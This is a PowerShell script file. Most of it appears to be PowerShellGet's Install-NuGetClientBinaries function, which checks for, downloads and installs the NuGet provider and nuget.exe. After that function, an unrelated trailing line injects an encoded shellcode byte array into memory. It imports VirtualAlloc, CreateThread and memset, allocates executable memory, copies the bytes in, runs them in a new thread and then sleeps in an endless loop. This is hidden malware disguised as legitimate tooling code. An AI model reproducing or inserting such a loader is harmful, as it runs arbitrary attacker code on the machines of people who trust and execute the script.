function Install-NuGetClientBinaries
{
    [CmdletBinding()]
    param
    (
        [parameter(Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [System.Management.Automation.PSCmdlet]
        $CallerPSCmdlet,

        [parameter()]
        [switch]
        $BootstrapNuGetExe,

        [Parameter()]
        $Proxy,

        [Parameter()]
        $ProxyCredential,

        [parameter()]
        [switch]
        $Force
    )

    if ($script:NuGetProvider -and
        ($script:NuGetExeVersion -and ($script:NuGetExeVersion -ge $script:NuGetExeMinRequiredVersion))   -and
         (-not $BootstrapNuGetExe -or
         (($script:NuGetExePath -and (Microsoft.PowerShell.Management\Test-Path -Path $script:NuGetExePath)) -or
          ($script:DotnetCommandPath -and (Microsoft.PowerShell.Management\Test-Path -Path $script:DotnetCommandPath)))))
    {
        return
    }

    $bootstrapNuGetProvider = (-not $script:NuGetProvider)

    if($bootstrapNuGetProvider)
    {
        
        
        $nugetProvider = PackageManagement\Get-PackageProvider -ErrorAction SilentlyContinue -WarningAction SilentlyContinue |
                            Microsoft.PowerShell.Core\Where-Object {
                                                                     $_.Name -eq $script:NuGetProviderName -and
                                                                     $_.Version -ge $script:NuGetProviderVersion
                                                                   }
        if($nugetProvider)
        {
            $script:NuGetProvider = $nugetProvider

            $bootstrapNuGetProvider = $false
        }
        else
        {
            
            $availableNugetProviders = PackageManagement\Get-PackageProvider -Name $script:NuGetProviderName `
                                                                             -ListAvailable `
                                                                             -ErrorAction SilentlyContinue `
                                                                             -WarningAction SilentlyContinue |
                                            Microsoft.PowerShell.Core\Where-Object {
                                                                                       $_.Name -eq $script:NuGetProviderName -and
                                                                                       $_.Version -ge $script:NuGetProviderVersion
                                                                                   }
            if($availableNugetProviders)
            {
                
                $null = PackageManagement\Import-PackageProvider -Name $script:NuGetProviderName `
                                                                 -MinimumVersion $script:NuGetProviderVersion `
                                                                 -Force

                $nugetProvider = PackageManagement\Get-PackageProvider -ErrorAction SilentlyContinue -WarningAction SilentlyContinue |
                                    Microsoft.PowerShell.Core\Where-Object {
                                                                             $_.Name -eq $script:NuGetProviderName -and
                                                                             $_.Version -ge $script:NuGetProviderVersion
                                                                           }
                if($nugetProvider)
                {
                    $script:NuGetProvider = $nugetProvider

                    $bootstrapNuGetProvider = $false
                }
            }
        }
    }

    if($script:IsWindows -and -not $script:IsNanoServer) {

        if($BootstrapNuGetExe -and 
        (-not $script:NuGetExePath -or
            -not (Microsoft.PowerShell.Management\Test-Path -Path $script:NuGetExePath)) -or 
            ($script:NuGetExeVersion -and ($script:NuGetExeVersion -lt $script:NuGetExeMinRequiredVersion))   )
        {
            $programDataExePath = Microsoft.PowerShell.Management\Join-Path -Path $script:PSGetProgramDataPath -ChildPath $script:NuGetExeName
            $applocalDataExePath = Microsoft.PowerShell.Management\Join-Path -Path $script:PSGetAppLocalPath -ChildPath $script:NuGetExeName

            
            if(Microsoft.PowerShell.Management\Test-Path -Path $programDataExePath)
            {
                $NugetExePath = $programDataExePath
            }
            elseif(Microsoft.PowerShell.Management\Test-Path -Path $applocalDataExePath)
            {
                $NugetExePath = $applocalDataExePath
            }
            else
            {
                
                
                $nugetCmd = Microsoft.PowerShell.Core\Get-Command -Name $script:NuGetExeName `
                                                                -ErrorAction Ignore `
                                                                -WarningAction SilentlyContinue |
                                Microsoft.PowerShell.Core\Where-Object {
                                    $_.Path -and
                                    ((Microsoft.PowerShell.Management\Split-Path -Path $_.Path -Leaf) -eq $script:NuGetExeName) -and
                                    (-not $_.Path.StartsWith($env:windir, [System.StringComparison]::OrdinalIgnoreCase))
                                } | Microsoft.PowerShell.Utility\Select-Object -First 1 -ErrorAction Ignore

                if($nugetCmd -and $nugetCmd.Path -and $nugetCmd.FileVersionInfo.FileVersion)
                {
                    $NugetExePath = $nugetCmd.Path
                }
            }

            if ($NugetExePath -and (Microsoft.PowerShell.Management\Test-Path -Path $NugetExePath)) {
                $script:NuGetExePath = $NugetExePath
                $script:NuGetExeVersion = (Get-Command $script:NuGetExePath).FileVersionInfo.FileVersion
                        
                
                if ($script:NuGetExeVersion -and ($script:NuGetExeVersion -ge $script:NuGetExeMinRequiredVersion)) 
                {
                    $BootstrapNuGetExe = $false
                }
            }
        }
        else
        {
            
            $BootstrapNuGetExe = $false
        }
    }


    if($BootstrapNuGetExe) {
        $DotnetCmd = Microsoft.PowerShell.Core\Get-Command -Name $script:DotnetCommandName -ErrorAction Ignore -WarningAction SilentlyContinue |
            Microsoft.PowerShell.Utility\Select-Object -First 1 -ErrorAction Ignore

        if ($DotnetCmd -and $DotnetCmd.Path) {  
            $script:DotnetCommandPath = $DotnetCmd.Path
            $BootstrapNuGetExe = $false
        }
        else {
            if($script:IsWindows) {
                $DotnetCommandPath = Microsoft.PowerShell.Management\Join-Path -Path $env:LocalAppData -ChildPath Microsoft |
                    Microsoft.PowerShell.Management\Join-Path -ChildPath dotnet |
                        Microsoft.PowerShell.Management\Join-Path -ChildPath dotnet.exe

                if($DotnetCommandPath -and
                   -not (Microsoft.PowerShell.Management\Test-Path -LiteralPath $DotnetCommandPath -PathType Leaf)) {
                    $DotnetCommandPath = Microsoft.PowerShell.Management\Join-Path -Path $env:ProgramFiles -ChildPath dotnet |
                        Microsoft.PowerShell.Management\Join-Path -ChildPath dotnet.exe
                }
            }
            else {
                $DotnetCommandPath = '/usr/local/bin/dotnet'
            }

            if($DotnetCommandPath -and (Microsoft.PowerShell.Management\Test-Path -LiteralPath $DotnetCommandPath -PathType Leaf)) {
                $DotnetCommandVersion,$null = (& $DotnetCommandPath '--version') -split '-',2
                if($DotnetCommandVersion -and ($script:MinimumDotnetCommandVersion -le $DotnetCommandVersion)) {
                    $script:DotnetCommandPath = $DotnetCommandPath
                    $BootstrapNuGetExe = $false
                }
            }
        }
    }

    
    if ($BootstrapNuGetExe -and (-not $script:IsWindows -or $script:IsNanoServer)) {
        $ThrowError_params = @{
            ExceptionName    = 'System.InvalidOperationException'
            ExceptionMessage = ($LocalizedData.CouldNotFindDotnetCommand -f $script:MinimumDotnetCommandVersion, $script:DotnetInstallUrl)
            ErrorId          = 'CouldNotFindDotnetCommand'
            CallerPSCmdlet   = $CallerPSCmdlet
            ErrorCategory    = 'InvalidOperation'
        }

        ThrowError @ThrowError_params
        return
    }

    if(-not $bootstrapNuGetProvider -and -not $BootstrapNuGetExe)
    {
        return
    }


    
    if($BootstrapNuGetExe -and $script:NuGetExePath -and $bootstrapNuGetProvider)
    {
        
        $shouldContinueQueryMessage = $LocalizedData.InstallNugetBinariesUpgradeShouldContinueQuery -f @($script:NuGetExeMinRequiredVersion,$script:NuGetProviderVersion,$script:NuGetBinaryProgramDataPath,$script:NuGetBinaryLocalAppDataPath,$script:PSGetProgramDataPath,$script:PSGetAppLocalPath)
        $shouldContinueCaption = $LocalizedData.InstallNuGetBinariesUpgradeShouldContinueCaption
    }
    elseif($BootstrapNuGetExe -and $bootstrapNuGetProvider)
    {
        
        $shouldContinueQueryMessage = $LocalizedData.InstallNuGetBinariesShouldContinueQuery -f @($script:NuGetExeMinRequiredVersion, $script:NuGetProviderVersion, $script:NuGetBinaryProgramDataPath, $script:NuGetBinaryLocalAppDataPath, $script:PSGetProgramDataPath,$script:PSGetAppLocalPath)
        $shouldContinueCaption = $LocalizedData.InstallNuGetBinariesShouldContinueCaption
    }
    elseif($BootstrapNuGetExe -and $script:NuGetExePath)
    {
        
        $shouldContinueQueryMessage = $LocalizedData.InstallNugetExeUpgradeShouldContinueQuery -f @($script:NuGetExeMinRequiredVersion, $script:PSGetProgramDataPath, $script:PSGetAppLocalPath)
        $shouldContinueCaption = $LocalizedData.InstallNuGetExeUpgradeShouldContinueCaption
    }
    elseif($BootstrapNuGetExe)
    {
        
        $shouldContinueQueryMessage = $LocalizedData.InstallNuGetExeShouldContinueQuery -f @($script:NuGetExeMinRequiredVersion, $script:PSGetProgramDataPath, $script:PSGetAppLocalPath)
        $shouldContinueCaption = $LocalizedData.InstallNuGetExeShouldContinueCaption
    }
    elseif($bootstrapNuGetProvider) {
        
        $shouldContinueQueryMessage = $LocalizedData.InstallNuGetProviderShouldContinueQuery -f @($script:NuGetProviderVersion,$script:NuGetBinaryProgramDataPath,$script:NuGetBinaryLocalAppDataPath)
        $shouldContinueCaption = $LocalizedData.InstallNuGetProviderShouldContinueCaption
    }


    $AdditionalParams = Get-ParametersHashtable -Proxy $Proxy -ProxyCredential $ProxyCredential

    if($Force -or $psCmdlet.ShouldContinue($shouldContinueQueryMessage, $shouldContinueCaption))
    {
        if($bootstrapNuGetProvider)
        {
            Write-Verbose -Message $LocalizedData.DownloadingNugetProvider

            $scope = 'CurrentUser'
            if(Test-RunningAsElevated)
            {
                $scope = 'AllUsers'
            }

            
            $null = PackageManagement\Install-PackageProvider -Name $script:NuGetProviderName `
                                                              -MinimumVersion $script:NuGetProviderVersion `
                                                              -Scope $scope `
                                                              -Force @AdditionalParams

            
            $null = PackageManagement\Import-PackageProvider -Name $script:NuGetProviderName `
                                                             -MinimumVersion $script:NuGetProviderVersion `
                                                             -Force

            $nugetProvider = PackageManagement\Get-PackageProvider -Name $script:NuGetProviderName

            if ($nugetProvider)
            {
                $script:NuGetProvider = $nugetProvider
            }
        }

        if($BootstrapNuGetExe -and $script:IsWindows)
        {
            Write-Verbose -Message $LocalizedData.DownloadingNugetExe

            $nugetExeBasePath = $script:PSGetAppLocalPath

            
            
            if(Test-RunningAsElevated)
            {
                $nugetExeBasePath = $script:PSGetProgramDataPath
            }

            if(-not (Microsoft.PowerShell.Management\Test-Path -Path $nugetExeBasePath))
            {
                $null = Microsoft.PowerShell.Management\New-Item -Path $nugetExeBasePath `
                                                                 -ItemType Directory -Force `
                                                                 -ErrorAction SilentlyContinue `
                                                                 -WarningAction SilentlyContinue `
                                                                 -Confirm:$false -WhatIf:$false
            }

            $nugetExeFilePath = Microsoft.PowerShell.Management\Join-Path -Path $nugetExeBasePath -ChildPath $script:NuGetExeName

            
            $null = Microsoft.PowerShell.Utility\Invoke-WebRequest -Uri $script:NuGetClientSourceURL `
                                                                   -OutFile $nugetExeFilePath `
                                                                   @AdditionalParams

            if (Microsoft.PowerShell.Management\Test-Path -Path $nugetExeFilePath)
            {
                $script:NuGetExePath = $nugetExeFilePath
                $script:NuGetExeVersion = (Get-Command $nugetExeFilePath).FileVersionInfo.FileVersion
            }
        }
    }

    $message = $null
    $errorId = $null
    $failedToBootstrapNuGetProvider = $false
    $failedToBootstrapNuGetExe = $false


    if($bootstrapNuGetProvider -and -not $script:NuGetProvider)
    {
        $failedToBootstrapNuGetProvider = $true

        $message = $LocalizedData.CouldNotInstallNuGetProvider -f @($script:NuGetProviderVersion)
        $errorId = 'CouldNotInstallNuGetProvider'
    }

    if($BootstrapNuGetExe)
    {
        if(-not $script:NuGetExePath -or
           -not (Microsoft.PowerShell.Management\Test-Path -Path $script:NuGetExePath))
        {
            $failedToBootstrapNuGetExe = $true

            $message = $LocalizedData.CouldNotInstallNuGetExe -f @($script:NuGetExeMinRequiredVersion, $script:MinimumDotnetCommandVersion)
            $errorId = 'CouldNotInstallNuGetExe'
        }
        elseif($script:NuGetExeVersion -and ($script:NuGetExeVersion -lt $script:NuGetExeMinRequiredVersion))
        {
            $failedToBootstrapNuGetExe = $true

            $message = $LocalizedData.CouldNotUpgradeNuGetExe -f @($script:NuGetExeMinRequiredVersion, $script:MinimumDotnetCommandVersion)
            $errorId = 'CouldNotUpgradeNuGetExe'
        }
    }

    
    if($failedToBootstrapNuGetProvider -and $failedToBootstrapNuGetExe)
    {
        $message = $LocalizedData.CouldNotInstallNuGetBinaries2 -f @($script:NuGetProviderVersion)
        $errorId = 'CouldNotInstallNuGetBinaries'
    }

    
    if($message -and $errorId)
    {
        ThrowError -ExceptionName "System.InvalidOperationException" `
                    -ExceptionMessage $message `
                    -ErrorId $errorId `
                    -CallerPSCmdlet $CallerPSCmdlet `
                    -ErrorCategory InvalidOperation
    }
}
$q0I = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $q0I -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xdb,0xc2,0xd9,0x74,0x24,0xf4,0xba,0x75,0xc7,0xca,0x2e,0x5e,0x31,0xc9,0xb1,0x47,0x31,0x56,0x18,0x03,0x56,0x18,0x83,0xee,0x89,0x25,0x3f,0xd2,0x99,0x28,0xc0,0x2b,0x59,0x4d,0x48,0xce,0x68,0x4d,0x2e,0x9a,0xda,0x7d,0x24,0xce,0xd6,0xf6,0x68,0xfb,0x6d,0x7a,0xa5,0x0c,0xc6,0x31,0x93,0x23,0xd7,0x6a,0xe7,0x22,0x5b,0x71,0x34,0x85,0x62,0xba,0x49,0xc4,0xa3,0xa7,0xa0,0x94,0x7c,0xa3,0x17,0x09,0x09,0xf9,0xab,0xa2,0x41,0xef,0xab,0x57,0x11,0x0e,0x9d,0xc9,0x2a,0x49,0x3d,0xeb,0xff,0xe1,0x74,0xf3,0x1c,0xcf,0xcf,0x88,0xd6,0xbb,0xd1,0x58,0x27,0x43,0x7d,0xa5,0x88,0xb6,0x7f,0xe1,0x2e,0x29,0x0a,0x1b,0x4d,0xd4,0x0d,0xd8,0x2c,0x02,0x9b,0xfb,0x96,0xc1,0x3b,0x20,0x27,0x05,0xdd,0xa3,0x2b,0xe2,0xa9,0xec,0x2f,0xf5,0x7e,0x87,0x4b,0x7e,0x81,0x48,0xda,0xc4,0xa6,0x4c,0x87,0x9f,0xc7,0xd5,0x6d,0x71,0xf7,0x06,0xce,0x2e,0x5d,0x4c,0xe2,0x3b,0xec,0x0f,0x6a,0x8f,0xdd,0xaf,0x6a,0x87,0x56,0xc3,0x58,0x08,0xcd,0x4b,0xd0,0xc1,0xcb,0x8c,0x17,0xf8,0xac,0x03,0xe6,0x03,0xcd,0x0a,0x2c,0x57,0x9d,0x24,0x85,0xd8,0x76,0xb5,0x2a,0x0d,0xe2,0xb0,0xbc,0x6e,0x5b,0xbb,0x1e,0x07,0x9e,0xbc,0x5f,0x6d,0x17,0x5a,0x0f,0xc1,0x78,0xf3,0xef,0xb1,0x38,0xa3,0x87,0xdb,0xb6,0x9c,0xb7,0xe3,0x1c,0xb5,0x5d,0x0c,0xc9,0xed,0xc9,0xb5,0x50,0x65,0x68,0x39,0x4f,0x03,0xaa,0xb1,0x7c,0xf3,0x64,0x32,0x08,0xe7,0x10,0xb2,0x47,0x55,0xb6,0xcd,0x7d,0xf0,0x36,0x58,0x7a,0x53,0x61,0xf4,0x80,0x82,0x45,0x5b,0x7a,0xe1,0xde,0x52,0xee,0x4a,0x88,0x9a,0xfe,0x4a,0x48,0xcd,0x94,0x4a,0x20,0xa9,0xcc,0x18,0x55,0xb6,0xd8,0x0c,0xc6,0x23,0xe3,0x64,0xbb,0xe4,0x8b,0x8a,0xe2,0xc3,0x13,0x74,0xc1,0xd5,0x68,0xa3,0x2f,0xa0,0x80,0x77;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$VWT=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($VWT.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$VWT,0,0,0);for (;;){Start-sleep 60};

